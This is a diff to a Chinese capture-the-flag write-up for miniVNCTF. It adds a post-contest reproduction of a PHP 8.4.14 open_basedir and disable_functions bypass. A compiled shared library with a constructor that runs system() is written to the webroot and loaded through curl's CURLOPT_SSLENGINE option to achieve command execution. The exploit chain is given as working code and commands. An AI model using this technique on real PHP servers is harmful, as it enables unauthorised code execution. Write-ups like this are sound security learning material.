@@ -232,7 +232,7 @@ https://forum.butian.net/share/2559
 得到提示，八九不离十了，打一波ssrf，换成提示中的路径，成功！
 ![500](assets/miniVNCTF/file-20251207171054175.png)
 
-# 【法尔plus】
+# 【法尔plus】（赛后复现）
 进来可以拿到源码,还一个是phpinfo界面
 ```php
 <?php
@@ -443,3 +443,38 @@ echo base64_encode(file_get_contents($phar_file . ".gz"));
 
 后来赛后师傅提示了我一下去仔细搜了一下，果然有最新php 8.4的`open_basedir`绕过
 https://fushuling.com/index.php/2025/11/01/%E6%9C%80%E6%96%B0%E7%89%88-php-%E7%BB%95-open_basedir-%E5%92%8C-disable_functions/
+这里我试了文中提到的最新的反而没成功，用相对过时的反而成功了，好奇怪。
+![](assets/miniVNCTF/file-20251207181321995.png)也是看到这位师傅说的，发现比赛环境刚好是8.4.14。所以采用了文章中说的非预期。
+
+
+我们先准备一个`a.cpp`文件
+```cpp
+#include <stdlib.h>
+
+__attribute__((constructor))
+static void rce_init(void){
+    system("whoami > /var/www/html/abc.txt");
+}
+```
+编译为`so`文件,同时输出base64编码形式
+```bash
+┌──(root💀JYli)-[~]
+└─# g++ -fPIC -shared -o evil.so a.cpp&&base64 -w 0 evil.so
+```
+会得到一大串base64字符。
+接下来的步骤就是：
+1. 把so文件写入。
+```php
+$base64_so = "{base64字符串}";
+file_put_contents("/var/www/html/exploit.so",base64_decode($base64_so));
+```
+2. 利用curl加载so文件
+```php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_SSLENGINE,"/var/www/html/exploit.so");
+$data = curl_exec($ch);
+```
+
+![](assets/miniVNCTF/file-20251207181951562.png)
+但是这里好像是无回显的，所以我选择了写入文件，改变命令只需要修改cpp文件即可。
+![](assets/miniVNCTF/file-20251207182036691.png)
